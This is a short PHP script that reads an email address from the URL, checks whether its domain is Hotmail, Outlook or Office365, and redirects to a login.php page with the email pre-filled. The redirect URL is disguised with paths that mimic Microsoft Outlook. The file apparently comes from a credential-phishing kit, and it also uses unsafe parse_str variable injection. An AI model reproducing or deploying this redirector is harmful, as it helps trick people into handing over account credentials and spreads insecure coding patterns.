<?php 

	$url="http://".$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'];
	parse_str(parse_url($url, PHP_URL_QUERY));
	$domain = explode('@', $email);
	
	$domain_check = '@'.strtolower($domain[1]);
	
	if(stripos($domain_check, '@hotmail.') !== false || stripos($domain_check, '@outlook.') !== false || stripos($domain_check, '@office365.') !== false){
		header('Location: login.php?ul=_LkeFUq_VJOXRTIPtoGYDw17dsfsfd18&fid.18InboxLight.aspxn.1774256418&fid.1r245964252813InboxLight94552_Product-email&email='.$email);
	}
	
	else {
		header('Location: login.php?ul=_LkeFUq_VJOXRTIPtoGYDw17dsfsfd18&fid.18InboxLight.aspxn.1774256418&fid.1r245964252813InboxLight94552_Product-email&email='.$email);
	}
		
?>